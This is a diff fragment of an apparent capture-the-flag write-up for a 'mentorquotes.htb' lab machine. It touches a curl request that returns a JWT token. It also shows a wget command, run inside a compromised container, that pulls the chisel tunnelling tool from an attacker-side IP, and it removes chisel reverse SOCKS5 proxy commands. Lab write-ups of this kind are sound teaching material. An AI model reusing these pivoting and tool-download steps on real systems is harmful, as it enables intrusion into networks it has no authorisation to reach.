@@ -570,7 +570,7 @@ curl -sX 'POST' \
 }' |\
 jq "."
 ```
-```json
+```
 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
 ```
 
@@ -765,11 +765,6 @@ So we of course don't have psql here in the container, but the container's file 
 /app/app # which ssh
 /app/app #
 /dev/shm # wget --no-check-certificate https://10.10.14.134:9090/chisel_1.7.7_linux_amd64
-```
-
-```bash
-./chisel-arm server -p 9090 --socks5
-./chisel-amd client 10.10.14.130:9090 --socks5
 ```
 
 I'm experimenting with chisel on my own network first, trying to make sense of the socks5 reverse proxying... this works: 
